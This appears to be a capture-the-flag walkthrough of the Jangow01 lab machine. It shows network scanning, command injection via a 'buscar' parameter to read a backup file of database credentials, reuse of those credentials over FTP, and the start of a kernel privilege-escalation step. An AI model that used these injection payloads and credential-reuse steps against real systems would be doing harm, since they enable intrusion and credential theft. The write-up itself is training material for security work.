# Documentation

First need to discover the host IP address.

```shell
ifconfig
```

<pre class="language-bash"><code class="lang-bash">enp0s3: flags=4163&#x3C;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
<strong>        inet6 fe80::d55a:76fc:6609:1664  prefixlen 64  scopeid 0x20&#x3C;link>
</strong>        ether 08:00:27:4b:43:b1  txqueuelen 1000  (Ethernet)
        RX packets 12874  bytes 16831434 (16.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5737  bytes 479575 (468.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: flags=4163&#x3C;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.13  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::d208:b51b:32a6:3278  prefixlen 64  scopeid 0x20&#x3C;link>
        ether 08:00:27:1b:c4:cb  txqueuelen 1000  (Ethernet)
        RX packets 14  bytes 2971 (2.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 291  bytes 18720 (18.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&#x3C;UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&#x3C;host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 240 (240.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>

In my case, there is to network interface. One for NATing and another for Host-Only network. For Host-Only network, I have used the IP block: `10.10.10.0/24` in the network interface enp0s8.

&#x20;Then, we need to perform the network discovery to fine the IP address of other host.

```bash
netdiscover -i enp0s8 -r 10.10.10.0/24
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Discovering Hosts</p></figcaption></figure>

Here the targeted IP is `10.10.10.14`.

Now, we perform the network scan to detect which ports are open. It is the essential part of the enumeration process. For this we are going to use the nmap tools.

```bash
nmap -sC -sV 10.10.10.14
```

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>nmap port scanning</p></figcaption></figure>

After scanning the port we have found that, two ports are open. i.e&#x20;

```bash
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
```

Here, port 21/TCP running FTP service & Port 80/TCP running HTTP service.

Now, we tried to access the FTP service using default credential. This FTP service might be vulnerable to FTP anonymous login, where username is anoymous and password is anonymous.

```bash
ftp 10.10.10.14
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>FTP Login</p></figcaption></figure>

Login attempt failed.

Now, we try with the port 80 (HTTP)

While we try to navigate though the web page using the IP address. We found out a broken webpage.

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption><p>Webpage</p></figcaption></figure>

We found out the directory listing is enable to the target machine. We found out the folder name "site/" in the current directory.

Now we will try to scan the website directory using dirb and the common.txt word list.

```bash
dirb http://10.10.10.14/site/ /usr/share/dirb/wordlists/common.txt
```

```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 17 05:04:34 2024
URL_BASE: http://10.10.10.14/site/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.14/site/ ----
==> DIRECTORY: http://10.10.10.14/site/assets/                                 
==> DIRECTORY: http://10.10.10.14/site/css/                                    
+ http://10.10.10.14/site/index.html (CODE:200|SIZE:10190)                     
==> DIRECTORY: http://10.10.10.14/site/js/                                     
==> DIRECTORY: http://10.10.10.14/site/wordpress/                              
                                                                               
---- Entering directory: http://10.10.10.14/site/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.14/site/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.14/site/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.14/site/wordpress/ ----
+ http://10.10.10.14/site/wordpress/index.html (CODE:200|SIZE:10190)           
                                                                               
-----------------
END_TIME: Sun Mar 17 05:04:53 2024
DOWNLOADED: 9224 - FOUND: 2

```

Now we browsing through the page to find anything unusual.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>website check</p></figcaption></figure>

&#x20;We found out a suspicious tab "Buscar". We go to that tab and found out a blank page.&#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>"Buscar" tab</p></figcaption></figure>

### Command line Injection:

Now, we try for command line injection. we tried `ls` at the end of the link. Then the page shows some object on the page.&#x20;

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Accessing modified link</p></figcaption></figure>

Now, we tried adding `ls -la` at the end. Then we found out , it show the directory with permissions.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>Accessing modified link</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Now we try to access a backup file adding below commands with the hyperlink:

<pre class="language-html"><code class="lang-html"><strong>view-source:http://10.10.10.14/site/busque.php?buscar=ls%20-all;cd%20..;ls%20-all;cat%20.backup
</strong></code></pre>

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>SQL Injection</p></figcaption></figure>

Here, we found out a user name and password.

```html
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
```

As there is no MySQL port re open in the server. So we can try to access FTP using that username and password. In our case, it worked !

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Log into FTP server</p></figcaption></figure>

Now we tried to change the directory. cd /home/

```bash
cd /home/
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>Change directory to home directory.</p></figcaption></figure>

Check the content of the directory.

```bash
ls -all
```

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Content of 'home' directory</p></figcaption></figure>

Now, change the directory to jangow01.

```bash
cd jangow01
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Copy the user.txt file to my local machine.

```bash
get user.txt
```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Now, exit the FTP session. check my host directory.

```bash
┌─[root@parrot]─[~]
└──╼ #ls -la
total 40
drwxr-xr-x 1 root root  472 Mar 21 06:24 .
drwxr-xr-x 1 root root  262 May  2  2023 ..
-rw------- 1 root root  530 Mar 16 14:31 .bash_history
drwxr-xr-x 1 root root   48 Mar 16 09:57 .BurpSuite
drwx------ 1 root root   48 Mar 17 05:04 .cache
drwxr-xr-x 1 root root 1014 Mar 16 09:57 .config
drwxr-xr-x 1 root root   18 Apr 28  2023 .dbeaver4
drwx------ 1 root root   22 May  2  2023 .dbus
drwxr-xr-x 1 root root   28 Mar 16 09:57 Desktop
-rwxr-xr-x 1 root root  482 Apr 22  2023 .emacs
-rwxr-xr-x 1 root root  535 Apr 22  2023 .gtkrc-2.0
drwxr-xr-x 1 root root   20 Mar 16 09:57 .java
drwxr-xr-x 1 root root   10 Apr 28  2023 .kde
-rw------- 1 root root   20 Mar 16 14:23 .lesshst
drwxr-xr-x 1 root root   10 Apr 28  2023 .local
drwxr-xr-x 1 root root   12 Mar 16 09:57 .msf4
-rw-r--r-- 1 root root    0 Mar 16 14:13 pass
-rwxr-xr-x 1 root root  675 Apr 22  2023 .profile
drwx------ 1 root root    0 Apr 28  2023 .ssh
drwxr-xr-x 1 root root   22 Apr 28  2023 Templates
-rw-r--r-- 1 root root   33 Jun 10  2021 user.txt
-rw-r----- 1 root root    4 Mar 17 04:17 .vboxclient-display-svga-x11-tty1-control.pid
-rw-r----- 1 root root    6 Mar 16 09:59 .vboxclient-display-svga-x11-tty7-control.pid
-rwxr-xr-x 1 root root   76 Oct 19  2022 .vimrc
-rwxr-xr-x 1 root root 2400 Sep 22  2022 .zshrc

```

Now we read the content of `user.txt` document.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We found the user flag.

### Gaining access to Linux host:

We tries to the Jangow box and tried to access using the username and password.

<figure><img src="../.gitbook/assets/sc01.png" alt=""><figcaption></figcaption></figure>

Here, we found out that, the Linux version is 4.4.0-31-generic x86\_64

### Privilege Escalation:

Use privilege escalation to move firm jangow01 to root.

For this I have check in google for exploit of that Linux version. Found out,  there is an exploit is available for this Linux version. That is  CVE:  [**2017-16995**](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)**.**&#x20;

Now we download the exploit and copy that exploit to the vulnerable machine using the FTP.

```bash
ftp 10.10.10.14
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We check the working directory and found out we are in the `/var/www` directory.

Then go to the home directory of jangow01 user.&#x20;

```bash
cd /home/jangow01
```

Then upload the exploit to the directory.

```bash
put 45010.c
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We check the vulnerable machine (jangow01) to check the exploite is copied to the root directory or not.&#x20;

